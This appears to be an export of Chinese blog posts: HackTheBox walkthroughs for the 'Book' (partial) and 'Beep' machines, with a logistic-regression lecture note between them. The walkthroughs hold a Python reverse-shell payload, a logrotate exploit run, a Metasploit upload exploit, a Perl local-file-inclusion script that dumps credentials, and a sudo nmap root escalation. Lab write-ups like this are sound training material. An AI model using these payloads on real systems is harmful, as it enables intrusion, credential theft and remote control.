PID&#x3D;78202 | sleep 5 2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0 PID&#x3D;78205 | &#x2F;usr&#x2F;sbin&#x2F;logrotate -f &#x2F;root&#x2F;log.cfg 2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0 PID&#x3D;78204 | &#x2F;bin&#x2F;sh &#x2F;root&#x2F;log.sh 2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0 PID&#x3D;78206 | sleep 5 如果logrotate是以root身份运行，并且普通用户对logrotate轮询的日志文件具有写的权限，那么就有一种漏洞利用可以提权。我们先来验证一下access.log是不是轮询的文件，向其中写入10M的随机比特流数据： 1234567891011121314reader@book:~&#x2F;backups$ head -c 10M &lt; &#x2F;dev&#x2F;urandom &gt; access.logreader@book:~&#x2F;backups$ ls -latotal 10252drwxr-xr-x 2 reader reader 4096 Jan 29 13:05 .drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..-rw-r--r-- 1 reader reader 10485760 Apr 15 02:35 access.log-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1reader@book:~&#x2F;backups$ ls -latotal 10252drwxr-xr-x 2 reader reader 4096 Apr 15 02:35 .drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..-rw-r--r-- 1 reader reader 0 Apr 15 02:35 access.log-rw-r--r-- 1 reader reader 10485760 Apr 15 02:35 access.log.1-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.2 很明显，多了一个access.log.2日志文件。 从https://github.com/whotwagner/logrotten下载logrotate exploit到本机，上传至靶机的主目录并编译： 1reader@book:~ gcc -o logrotten logrotten.c 再准备一个payloadfile，写入reverse shell，在本机监听4444端口 12reader@book:~ cat payloadfilepython -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.55&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; 然后执行exploit 12reader@book:~ .&#x2F;logrotten -p .&#x2F;payloadfile &#x2F;home&#x2F;reader&#x2F;backups&#x2F;access.logWaiting for rotating backups&#x2F;access.log... 于此同时，在另外一个终端登录靶机，向轮询日志中写入随机数据，观察主机4444端口： 12345$nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.15.152] from (UNKNOWN) [10.10.10.176] 50008# cat &#x2F;root&#x2F;root.txt84da9--------------------0dd89714 0x04 Reference https://github.com/whotwagner/logrotten https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"Machine-Learning-Week3","date":"2020-04-09T02:15:46.000Z","path":"Machine_learning/basic_learning/3.Machine-Learning-Week3/","text":"这一篇主要总结逻辑回归相关知识点 Machine Learning Week3 0x01 假设表示(Hypothesis Representation) 逻辑回归算法的假设函数 hθ(x) 由以下表达式组成： $$ \\begin{align*}&amp; h_\\theta (x) = g ( \\theta^T x ) \\newline \\newline&amp; z = \\theta^T x \\newline&amp; g(z) = \\dfrac{1}{1 + e^{-z}}\\end{align*} $$ 其中g(z) 称为逻辑函数（Logistic Function），又称为 Sigmoid Function。 该函数的图像为： hθ(x) 的作用是，对于给定的输入变量，根据选择的参数计算输出变量=1的可能性，即hθ(x) = P(y=0|x;θ) ，例如，如果对于给定的x，通过已经确定的参数计算得出hθ(x) = 0.7，则表示有70%的几率y为正向类，相应地为负向类的几率为1-0.7=0.3。 0x02 判定边界(Decision Boundary) 在逻辑回归中，我们预测： 当 hθ(x) &gt;= 0.5时，预测y=1; 当 hθ(x) &lt; 0.5时，预测y=0; 根据S形函数图像，当 z = 0时，g(z) = 0.5; z &gt; 0时，g(z) &gt; 0.5; z &lt; 0时，g(z) &lt; 0.5; 又z = θTx，即 θTx &gt;= 0时，预测y=1， θTx &lt; 0时，预测y=0 现在假设我们有一个模型： 并且参数θ是向量[-3 1 1]。 则当-3 + x1 + x2 &gt;= 0，即x1 + x2 &gt;= 3时，模型将预测 y = 1 。 我们可以绘制直线x1 + x2 = 3，这条线便是我们模型的分界线，将预测为1的区域和预测为 0的区域分隔开。 也就是说，z = θTx在几何角度中就是判定边界的函数。决策边界只与参数 θ 有关。 0x03 代价函数(Cost Function) 公式表示： $$ \\begin{align*}&amp; J(\\theta) = \\dfrac{1}{m} \\sum_{i=1}^m \\mathrm{Cost}(h_\\theta(x{(i)}),y{(i)}) \\newline &amp; \\mathrm{Cost}(h_\\theta(x),y) = -\\log(h_\\theta(x)) ; &amp; \\text{if y = 1} \\newline &amp; \\mathrm{Cost}(h_\\theta(x),y) = -\\log(1-h_\\theta(x)) ; &amp; \\text{if y = 0}\\end{align*} $$ 几何意义： 这样构建的Cost(hθ(x), y)函数的特点是：当实际的y =1且 hθ(x) 也为1 时误差为 0，当 y = 1但hθ(x)不为1时误差随着hθ(x)变小而变大；当实际的y = 0且hθ(x)也为 0 时代价为 0，当y = 0但hθ(x)不为0时，误差随着hθ(x)的变大而变大。 进一步整理一下： $$ \\mathrm{Cost}(h_\\theta(x),y) = - y ; \\log(h_\\theta(x)) - (1 - y) \\log(1 - h_\\theta(x)) $$ 带入： $$ J(\\theta) = \\dfrac{1}{m} \\sum_{i=1}^m - y^{(i)} ; \\log(h_\\theta(x^{(i)})) - (1 - y^{(i)}) \\log(1 - h_\\theta(x^{(i)})) $$ 向量化： $$ \\begin{align*} &amp; h = g(X\\theta)\\newline &amp; J(\\theta) = \\frac{1}{m} \\cdot \\left(-y{T}\\log(h)-(1-y){T}\\log(1-h)\\right) \\end{align*} $$ 0x04 梯度下降(Gradient Descent) 梯度下降的一般形式： $$ \\begin{align*}&amp; Repeat ; \\lbrace \\newline &amp; ; \\theta_j := \\theta_j - \\alpha \\dfrac{\\partial}{\\partial \\theta_j}J(\\theta) \\newline &amp; \\rbrace\\end{align*} $$ 代入J(θ)： $$ \\begin{align*} &amp; Repeat ; \\lbrace \\newline &amp; ; \\theta_j := \\theta_j - \\frac{\\alpha}{m} \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y^{(i)}) x_j^{(i)} \\newline &amp; \\rbrace \\end{align*} $$ 可以发现，逻辑回归的梯度下降和线性回归的梯度下降在形式上是完全相同的，但是假设函数hθ(x)发生了变化。 向量化： $$ \\theta := \\theta - \\frac{\\alpha}{m}X^T(g(X\\theta) - \\vec y) $$ 0x05 多分类(Muti-classification) 处理多分类问题的本质就是转化为二分类问题，现在假设有三个类别： 用三角形表示y = 1 ，方框表示y = 2，叉叉表示y = 3 。我们下面要做的就是使用一个训练集，将其分成3个二元分类问题 为了能实现这样的转变，我们将多个类中的一个类标记为正向类（y = 1），然后将其他所有类都标记为负向类，这个模型记作hθ(1) (x)。接着，类似地第我们选择另一个类标记为正向类（y = 2），再将其它类都标记为负向类，将这个模型记作 hθ(2) (x)，依此类推。最后，为了做出预测，我们给出输入一个新的x值，用这个做预测。我们要做的就是在我们三个分类器里面输入x ，然后我们选择一个让 hθ(i) (x)最大的i，即： $$ \\arg\\max_\\theta h_{\\theta}^{(i)} $$ 0x06 正则化(Regularization) 所谓正则化，就是为了防止出现过拟合而对某些θ参数引入惩罚因子，这样做的话，我们在尝试最小化代价时也需要将这个惩罚纳入考虑中，并最终导致选择较小一些的θ。 比如回归问题中如果我们的假设函数是： $$ h_\\theta (x) = \\theta_0 + \\theta_1 x_1 + \\theta_2 x_2^2 + \\theta_3 x_3^3 + \\theta_4 x_4^4 $$ 我们想对θ3和θ4设置一点惩罚，修改后的代价函数为： $$ min_\\theta \\frac{1}{2m}[\\sum_{i=1}{m}(h_\\theta(x{(i)})-y{(i)})2 + 1000\\theta_3^2 + 1000\\theta_4^2] $$ 假如我们有非常多的特征，我们并不知道其中哪些特征我们要惩罚，我们将对所有的特征进行惩罚，并且让代价函数最优化的软件来选择这些惩罚的程度。这样的结果是得到了一个较为简单的能防止过拟合问题的假设： $$ min_\\theta \\frac{1}{2m}[\\sum_{i=1}{m}(h_\\theta(x{(i)})-y{(i)})2 + \\lambda\\sum_{i=1}m\\theta_j2] $$ 其中λ又称为正则化参数（Regularization Parameter）。 正则化线性回归 $$ \\begin{align*} &amp; \\text{Repeat}\\ \\lbrace \\newline &amp; \\ \\ \\ \\ \\theta_0 := \\theta_0 - \\alpha\\ \\frac{1}{m}\\ \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y{(i)})x_0{(i)} \\newline &amp; \\ \\ \\ \\ \\theta_j := \\theta_j - \\alpha\\ \\left[ \\left( \\frac{1}{m}\\ \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y{(i)})x_j{(i)} \\right) + \\frac{\\lambda}{m}\\theta_j \\right] &amp;\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ j \\in \\lbrace 1,2…n\\rbrace\\newline &amp; \\rbrace \\end{align*} $$ 正规方程求解正则化线性回归 $$ \\begin{align*}&amp; \\theta = \\left( X^TX + \\lambda \\cdot L \\right)^{-1} X^Ty \\newline&amp; \\text{where}\\ \\ L = \\begin{bmatrix} 0 &amp; &amp; &amp; &amp; \\newline &amp; 1 &amp; &amp; &amp; \\newline &amp; &amp; 1 &amp; &amp; \\newline &amp; &amp; &amp; \\ddots &amp; \\newline &amp; &amp; &amp; &amp; 1 \\newline\\end{bmatrix}\\end{align*} $$ 正则化逻辑回归 同样对于逻辑回归，我们也给代价函数增加一个正则化的表达式，得到代价函数： $$ J(\\theta) = -\\dfrac{1}{m} \\sum_{i=1}^m [y^{(i)} ; \\log(h_\\theta(x^{(i)})) + (1 - y^{(i)}) \\log(1 - h_\\theta(x^{(i)}))] + \\frac{\\lambda}{2m}\\sum_{j=1}^n \\theta_j^2 $$","tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"逻辑回归","slug":"逻辑回归","permalink":"http://ca0y1h.top/tags/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"}],"categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"基础入门","slug":"机器学习/基础入门","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"HTB:Beep-walkthrough","date":"2020-04-07T15:14:59.000Z","path":"Target_drone/HackTheBox/13.HTB-Beep-walkthrough/","text":"HTB::Beep Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap sslscan wfuzz vtigercrm LFI Elastix / FreeFBX Nmap Privilege Escalation 0x03 Pentesting Initial Enumeration 端口扫描 12345678910111213141516171819202122232425262728293031323334353637# Nmap 7.80 scan initiated Tue Apr 7 03:18:33 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.7Nmap scan report for 10.10.10.7Host is up (0.25s latency).Not shown: 987 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 4.3 (protocol 2.0)| ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)|_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)25&#x2F;tcp open smtp Postfix smtpd|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 80&#x2F;tcp open http Apache httpd 2.2.3|_http-server-header: Apache&#x2F;2.2.3 (CentOS)|_http-title: Did not follow redirect to https:&#x2F;&#x2F;10.10.10.7&#x2F;|_https-redirect: ERROR: Script execution failed (use -d to debug)110&#x2F;tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_pop3-capabilities: TOP APOP UIDL IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) STLS RESP-CODES AUTH-RESP-CODE USER EXPIRE(NEVER) PIPELINING111&#x2F;tcp open rpcbind 2 (RPC #100000)143&#x2F;tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_imap-capabilities: THREAD&#x3D;REFERENCES ATOMIC Completed MAILBOX-REFERRALS OK RENAME LISTEXT LITERAL+ MULTIAPPEND X-NETSCAPE LIST-SUBSCRIBED CHILDREN UNSELECT RIGHTS&#x3D;kxte URLAUTHA0001 IDLE IMAP4rev1 SORT&#x3D;MODSEQ ID BINARY IMAP4 CONDSTORE CATENATE SORT ANNOTATEMORE NO UIDPLUS STARTTLS ACL NAMESPACE THREAD&#x3D;ORDEREDSUBJECT QUOTA443&#x2F;tcp open ssl&#x2F;https?|_ssl-date: 2020-04-07T07:23:36+00:00; +1m25s from scanner time.880&#x2F;tcp open status 1 (RPC #100024)993&#x2F;tcp open ssl&#x2F;imap Cyrus imapd|_imap-capabilities: CAPABILITY995&#x2F;tcp open pop3 Cyrus pop3d3306&#x2F;tcp open mysql MySQL (unauthorized)4445&#x2F;tcp open upnotifyp?10000&#x2F;tcp open http MiniServ 1.570 (Webmin httpd)|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).Service Info: Hosts: beep.localdomain, 127.0.0.1, example.comHost script results:|_clock-skew: 1m24sService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Tue Apr 7 03:24:47 2020 -- 1 IP address (1 host up) scanned in 374.24 seconds SSL scan 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [4:37:19] C:127$ sslscan 10.10.10.7Version: 2.0.0-staticOpenSSL 1.1.1f-dev xx XXX xxxxConnected to 10.10.10.7Testing SSL server 10.10.10.7 on port 443 using SNI name 10.10.10.7 SSL&#x2F;TLS Protocols:SSLv2 disabledSSLv3 enabledTLSv1.0 enabledTLSv1.1 disabled TLSv1.2 disabledTLSv1.3 disabled TLS Fallback SCSV:Server does not support TLS Fallback SCSV TLS renegotiation:Secure session renegotiation supported TLS Compression:Compression enabled (CRIME) Heartbleed:TLSv1.0 not vulnerable to heartbleed Supported Server Cipher(s):Preferred TLSv1.0 256 bits DHE-RSA-AES256-SHA DHE 1024 bitsAccepted TLSv1.0 128 bits DHE-RSA-AES128-SHA DHE 1024 bitsAccepted TLSv1.0 112 bits DHE-RSA-DES-CBC3-SHA DHE 1024 bitsAccepted TLSv1.0 256 bits AES256-SHA Accepted TLSv1.0 128 bits AES128-SHA Accepted TLSv1.0 128 bits RC4-SHAAccepted TLSv1.0 112 bits DES-CBC3-SHA Accepted TLSv1.0 56 bits TLS_RSA_WITH_DES_CBC_SHA Accepted TLSv1.0 56 bits TLS_DHE_RSA_WITH_DES_CBC_SHA Server Signature Algorithm(s):TLSv1.0 Server accepts all signature algorithms. SSL Certificate:Signature Algorithm: sha1WithRSAEncryptionRSA Key Strength: 1024Subject: localhost.localdomainIssuer: localhost.localdomainNot valid before: Apr 7 08:22:08 2017 GMTNot valid after: Apr 7 08:22:08 2018 GMT wfuzz扫描目录 Getting User Access 寻找vtigercrm v5.1.0的漏洞 尝试``vtiger_php_exec不行再换vtiger_soap_upload`，可以反弹shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950msf5 exploit(multi&#x2F;http&#x2F;vtiger_php_exec) &gt; use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_uploadmsf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; show optionsModule options (exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL&#x2F;TLS for outgoing connections TARGETURI &#x2F;vtigercrm&#x2F; yes Base vTiger CRM directory path VHOST no HTTP server virtual hostExploit target: Id Name -- ---- 0 vTigerCRM v5.4.0msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RHOSTS 10.10.10.7RHOSTS &#x3D;&gt; 10.10.10.7msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RPORT 443RPORT &#x3D;&gt; 443msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set SSL trueSSL &#x3D;&gt; truemsf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set LHOST 10.10.14.5LHOST &#x3D;&gt; 10.10.14.5msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; check[+] 10.10.10.7:443 - The target is vulnerable.msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; exploit [*] Started reverse TCP handler on 10.10.14.5:4444 [*] Uploading payload...[+] Upload successfully uploaded[*] Executing payload...[*] Sending stage (38288 bytes) to 10.10.10.7[*] Meterpreter session 1 opened (10.10.14.5:4444 -&gt; 10.10.10.7:43989) at 2020-04-07 10:50:50 -0400[!] This exploit may require manual cleanup of &#39;bPRojImibS.php&#39; on the targetmeterpreter &gt; [+] Deleted bPRojImibS.phpshellProcess 8916 created.Channel 0 created.iduid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk) 获取user flag 12345678910111213141516171819202122python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot; sh-3.2$ ididuid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk)sh-3.2$ pwdpwd&#x2F;var&#x2F;www&#x2F;html&#x2F;vtigercrmsh-3.2$ cd &#x2F;home&#x2F;faniscd &#x2F;home&#x2F;fanissh-3.2$ ls -lals -latotal 32drwxrwxr-x 2 fanis fanis 4096 Apr 7 2017 .drwxr-xr-x 4 root root 4096 Apr 7 2017 ..-rw------- 1 fanis fanis 114 Apr 7 2017 .bash_history-rw-r--r-- 1 fanis fanis 33 Apr 7 2017 .bash_logout-rw-r--r-- 1 fanis fanis 176 Apr 7 2017 .bash_profile-rw-r--r-- 1 fanis fanis 124 Apr 7 2017 .bashrc-rw-rw-r-- 1 fanis fanis 33 Apr 7 2017 user.txtsh-3.2$ cat user.txtcat user.txtaeff3def0c765c2677b94715cffa73ac Getting Root Access 提权 123456789101112131415161718192021222324sh-3.2$ sudo -lsudo -lMatching Defaults entries for asterisk on this host: env_reset, env_keep&#x3D;&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;User asterisk may run the following commands on this host: (root) NOPASSWD: &#x2F;sbin&#x2F;shutdown (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;yum (root) NOPASSWD: &#x2F;bin&#x2F;touch (root) NOPASSWD: &#x2F;bin&#x2F;chmod (root) NOPASSWD: &#x2F;bin&#x2F;chown (root) NOPASSWD: &#x2F;sbin&#x2F;service (root) NOPASSWD: &#x2F;sbin&#x2F;init (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postmap (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postfix (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;saslpasswd2 (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;hardware_detector (root) NOPASSWD: &#x2F;sbin&#x2F;chkconfig (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;elastix-helper 命中Nmap，以root权限执行且无需认证 较早版本的Nmap（2.02至5.21）具有交互模式，该模式允许用户执行Shell命令由于Nmap在以root特权执行的二进制文件列表中，因此可以使用交互式控制台来以相同的特权运行shell 12345678910111213sh-3.2$ sudo nmap --interactivesudo nmap --interactiveStarting Nmap V. 4.11 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh!shsh-3.2# whoamiwhoamirootsh-3.2# cat &#x2F;root&#x2F;root.txtcat &#x2F;root&#x2F;root.txtd88e006123842106982acce0aaf453f0 Another Way 重点关注几个常见服务 22(ssh)、80(apache)、443(https)、3306(mysql)、10000(httpd)，访问 https://10.10.10.7:443 ，返回登录页面： 使用默认登录密码：username: admin password: palosanto，登录错误。 searchsploit找一下相关漏洞： 尝试本地包含漏洞，因为靶机上的SSL证书过期了，所以要修改一下利用脚本： https://stackoverflow.com/questions/336575/can-i-force-lwpuseragent-to-accept-an-expired-ssl-certificate 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/perl -w#------------------------------------------------------------------------------------#Elastix is an Open Source Sofware to establish Unified Communications. #About this concept, Elastix goal is to incorporate all the communication alternatives, #available at an enterprise level, into a unique solution. #------------------------------------------------------------------------------------############################################################ # Exploit Title: Elastix 2.2.0 LFI # Google Dork: :( # Author: cheki # Version:Elastix 2.2.0# Tested on: multiple# CVE : notyet# romanc-_-eyes ;) # Discovered by romanc-_-eyes# vendor http://www.elastix.org/print &quot;\\t Elastix 2.2.0 LFI Exploit \\n&quot;;print &quot;\\t code author cheki \\n&quot;;print &quot;\\t 0day Elastix 2.2.0 \\n&quot;;print &quot;\\t email: anonymous17hacker&#123;&#125;gmail.com \\n&quot;;#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;actionuse LWP::UserAgent;print &quot;\\n Target: https://ip &quot;;chomp(my $target=&lt;STDIN&gt;);$dir=&quot;vtigercrm&quot;;$poc=&quot;current_language&quot;;$etc=&quot;etc&quot;;$jump=&quot;../../../../../../../..//&quot;;$test=&quot;amportal.conf%00&quot;;$code = LWP::UserAgent-&gt;new() or die &quot;inicializacia brauzeris\\n&quot;;$code-&gt;ssl_opts(verify_hostname =&gt; 0, SSL_verify_mode =&gt; 0x00);$code-&gt;agent(&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#x27;);$host = $target . &quot;/&quot;.$dir.&quot;/graph.php?&quot;.$poc.&quot;=&quot;.$jump.&quot;&quot;.$etc.&quot;/&quot;.$test.&quot;&amp;module=Accounts&amp;action&quot;;$res = $code-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));$answer = $res-&gt;content; if ($answer =~ &#x27;This file is part of FreePBX&#x27;) &#123; print &quot;\\n read amportal.conf file : $answer \\n\\n&quot;;print &quot; successful read\\n&quot;; &#125;else &#123; print &quot;\\n[-] not successful\\n&quot;; &#125; 从之前 sslscan 的扫描结果我们看到靶机只支持 TLSv1.0，因此我们需要修改 Kali 的openssl配置文件 123456[system_default_sect]#MinProtocol &#x3D; TLSv1.2#CipherString &#x3D; DEFAULT@SECLEVEL&#x3D;2MinProtocol &#x3D; TLSv1.0CipherString &#x3D; DEFAUT 再执行利用脚本 12345678910111213141516# kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:15:57]$ perl 37637.pl &gt; elastix# kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:16:34]$ cat elastix...AMPDBHOST&#x3D;localhostAMPDBENGINE&#x3D;mysql# AMPDBNAME&#x3D;asteriskAMPDBUSER&#x3D;asteriskuser# AMPDBPASS&#x3D;amp109AMPDBPASS&#x3D;jEhdIekWmdjEAMPENGINE&#x3D;asteriskAMPMGRUSER&#x3D;admin#AMPMGRPASS&#x3D;amp111AMPMGRPASS&#x3D;jEhdIekWmdjE... 利用payload直接在网页上查看/etc/passwd 123456789101112131415161718192021222324252627282930313233343536root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashbin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologindaemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologinadm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologinlp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologinsync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;syncshutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdownhalt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;haltmail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologinnews:x:9:13:news:&#x2F;etc&#x2F;news:uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;sbin&#x2F;nologinoperator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologingames:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologingopher:x:13:30:gopher:&#x2F;var&#x2F;gopher:&#x2F;sbin&#x2F;nologinftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologinnobody:x:99:99:Nobody:&#x2F;:&#x2F;sbin&#x2F;nologinmysql:x:27:27:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;bashdistcache:x:94:94:Distcache:&#x2F;:&#x2F;sbin&#x2F;nologinvcsa:x:69:69:virtual console memory owner:&#x2F;dev:&#x2F;sbin&#x2F;nologinpcap:x:77:77::&#x2F;var&#x2F;arpwatch:&#x2F;sbin&#x2F;nologinntp:x:38:38::&#x2F;etc&#x2F;ntp:&#x2F;sbin&#x2F;nologincyrus:x:76:12:Cyrus IMAP Server:&#x2F;var&#x2F;lib&#x2F;imap:&#x2F;bin&#x2F;bashdbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologinapache:x:48:48:Apache:&#x2F;var&#x2F;www:&#x2F;sbin&#x2F;nologinmailman:x:41:41:GNU Mailing List Manager:&#x2F;usr&#x2F;lib&#x2F;mailman:&#x2F;sbin&#x2F;nologinrpc:x:32:32:Portmapper RPC user:&#x2F;:&#x2F;sbin&#x2F;nologinpostfix:x:89:89::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;sbin&#x2F;nologinasterisk:x:100:101:Asterisk VoIP PBX:&#x2F;var&#x2F;lib&#x2F;asterisk:&#x2F;bin&#x2F;bashrpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologinnfsnobody:x:65534:65534:Anonymous NFS User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologinsshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologinspamfilter:x:500:500::&#x2F;home&#x2F;spamfilter:&#x2F;bin&#x2F;bashhaldaemon:x:68:68:HAL daemon:&#x2F;:&#x2F;sbin&#x2F;nologinxfs:x:43:43:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologinfanis:x:501:501::&#x2F;home&#x2F;fanis:&#x2F;bin&#x2F;bashSorry! Attempt to access restricted file. 使用fanis : jEhdIekWmdjE登录靶机发现密码错误，再一看Writeup，直接是可以root登录…orz== 123456789101112131415161718# kali @ kali in ~/HackTheBox/Beep [9:19:31] $ ssh root@10.10.10.7root@10.10.10.7&#x27;s password: Last login: Tue Apr 7 16:20:42 2020 from 10.10.14.5Welcome to Elastix ----------------------------------------------------To access your Elastix System, using a separate workstation (PC/MAC/Linux)Open the Internet Browser using the following URL:http://10.10.10.7[root@beep ~]# iduid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)[root@beep ~]# cat /root/root.txt d88e006123842106982acce0aaf453f0[root@beep ~]# cat /home/fanis/user.txt aeff3def0c765c2677b94715cffa73ac","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Blocky Walkthrough","date":"2020-04-07T06:07:44.000Z","path":"Target_drone/HackTheBox/12.HTB-Blocky-walkthrough/","text":"HTB::Blocky Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap dirsearch wpscan jad 0x03 Pentesting Initial Enumeration nmap scan 1234567891011121314151617181920Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-14 10:54 CET Nmap scan report for 10.10.10.37 Host is up (0.085s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 21&#x2F;tcp open ftp ProFTPD 1.3.5a 22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | 